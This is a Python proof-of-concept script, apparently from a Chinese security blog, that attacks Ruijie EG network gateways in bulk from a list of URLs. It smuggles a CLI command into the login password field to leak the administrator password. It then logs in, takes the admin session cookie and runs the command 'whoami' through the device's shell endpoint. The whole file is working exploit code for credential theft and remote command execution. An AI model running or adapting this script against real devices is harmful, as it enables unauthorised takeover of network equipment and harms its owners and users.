import base64
import requests
import random
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[31m公众号  : 深夜笔记本                                                  \033[0m')
    print('+  \033[31mVersion: 锐捷eg网关                                                  \033[0m')
    print('+  \033[31m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[31m保存连接到url.txt                                                    \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    url = target_url + "/login.php"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'username=admin&password=admin?show+webmaster+user'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.post(url=url, data=data, headers=headers, verify=False, timeout=10)
        if "data" in r.text and r.status_code == 200:
            password = re.findall(r'admin (.*?)"', r.text)[0]
            print("\033[31m[o] 登陆地址 {}\033[0m".format(target_url))
            print("\033[31m[o] 成功获取, 账号密码为:  admin   {} \033[0m".format(password))
            POC_2(target_url, password)

    except Exception as e:
        print('\033[36m-\033[0m' * 50)
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        print('\033[36m-\033[0m' * 50)


def POC_2(target_url, password):
    url = target_url + "/login.php"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'username=admin&password={}'.format(password)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.post(url=url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在登录..... \033[0m".format(target_url))
        if "status" in r.text and "1" in r.text and r.status_code == 200:
            rj_cookie = "RUIJIEID=" + re.findall(r"'Set-Cookie': 'RUIJIEID=(.*?);", str(r.headers))[0] + ";user=admin;"
            print("\033[36m[o] 获取管理员Cookie为: {} \033[0m".format(rj_cookie))
            POC_3(target_url, rj_cookie)
            print('\033[36m-\033[0m' * 50)
    except Exception as e:
        print('\033[36m-\033[0m' * 50)
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        print('\033[36m-\033[0m' * 50)


def POC_3(target_url, rj_cookie):
    url = target_url + "/cli.php?a=shell"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": "{}".format(rj_cookie)
    }
    data = 'notdelay=true&command=whoami'
    try:
        r = requests.post(url=url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[31m[o] 执行 whoami..... \033[0m".format(target_url))
        if "data" in r.text and r.status_code == 200:
            print("\033[31m[o] 成功执行 whoami \n[o] 内容:{} \033[0m".format(r.text))

    except Exception as e:
        print('\033[36m-\033[0m' * 50)
        print("\033[36m[x] 失败:{} \033[0m".format(e))



if __name__ == '__main__':
    title()
    with open('./poc/url.txt', 'r', encoding='utf-8') as f:
        for i in f.readlines():
            s = i.strip()
            target_url = s
            POC_1(target_url)
